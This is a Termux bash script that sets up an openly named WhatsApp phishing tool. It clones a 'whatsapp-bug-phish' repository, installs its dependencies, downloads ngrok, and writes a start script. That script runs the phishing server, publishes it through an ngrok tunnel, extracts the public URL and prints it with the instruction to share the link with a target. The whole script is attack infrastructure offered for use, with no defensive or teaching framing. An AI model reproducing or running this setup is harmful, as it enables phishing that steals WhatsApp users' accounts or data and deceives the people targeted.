#!/data/data/com.termux/files/usr/bin/bash

echo "[+] Setting up WhatsApp Bug Phishing in Termux..."
echo "[+] Updating packages..."
pkg update -y && pkg upgrade -y

echo "[+] Installing Node.js, git, curl..."
pkg install nodejs git curl -y

echo "[+] Cloning repository..."
git clone https://github.com/dcodemaxz/whatsapp-bug-phish.git
cd whatsapp-bug-phish

echo "[+] Installing dependencies..."
npm install

echo "[+] Setting up ngrok for public URL..."
pkg install wget -y
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
tar xvzf ngrok-v3-stable-linux-arm64.tgz
chmod +x ngrok

echo "[+] Creating start script..."
cat > start.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
clear
echo "
===========================================
   WHATSAPP BUG PHISHING TOOL - TERMUX
===========================================
"
echo "[1] Starting local server..."
node server.js &
SERVER_PID=$!

sleep 3

echo "[2] Starting ngrok tunnel..."
./ngrok authtoken YOUR_NGROK_TOKEN_HERE
./ngrok http 3000 > /dev/null &

sleep 5

echo "[3] Getting public URL..."
curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | head -1 | cut -d'"' -f4 > url.txt
PUBLIC_URL=$(cat url.txt)

echo "[+] SERVER IS RUNNING!"
echo "[+] Local: http://localhost:3000"
echo "[+] Public: $PUBLIC_URL"
echo "[+] Admin: http://localhost:3000/admin"
echo ""
echo "[+] Share this link to target: $PUBLIC_URL"
echo "[+] Press Ctrl+C to stop"
echo ""

wait $SERVER_PID
EOF

chmod +x start.sh

echo "[+] Setup complete!"
echo "[+] To start: ./start.sh"
echo "[+] Don't forget to get ngrok token from https://ngrok.com"
echo "[+] Replace 'YOUR_NGROK_TOKEN_HERE' in start.sh"
